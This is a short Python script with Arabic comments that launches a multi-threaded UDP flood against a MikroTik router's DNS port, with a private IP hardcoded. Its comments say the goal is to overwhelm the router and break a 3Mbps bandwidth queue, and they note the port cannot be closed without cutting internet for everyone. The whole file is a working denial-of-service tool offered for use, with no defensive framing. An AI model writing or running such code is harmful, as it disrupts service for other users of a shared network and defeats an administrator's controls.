import socket
import threading

# عنوان الراوتر الذي أخرجناه سابقاً
target_ip = "172.18.14.1" 
# منفذ 53 هو منفذ الـ DNS لا يمكن لمهندس الشبكة إغلاقه وإلا سيتوقف الإنترنت عن الجميع
target_port = 53 

def flood():
    # استخدام بروتوكول UDP لأنه لا ينتظر رداً ويضخ البيانات بجنون
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # توليد حزمة بيانات وهمية بحجم كبير نسبياً
    payload = b"X" * 2048 
    while True:
        try:
            sock.sendto(payload, (target_ip, target_port))
        except:
            pass

print("[*] Initiating Ghost Bypass Flood...")
print("[*] Target: Mikrotik Router (Port 53)")
print("[*] Bypassing 3Mbps Queue...")

# فتح 50 مسار (Thread) تهاجم في نفس اللحظة لكسر العداد
for i in range(50):
    thread = threading.Thread(target=flood)
    thread.start()

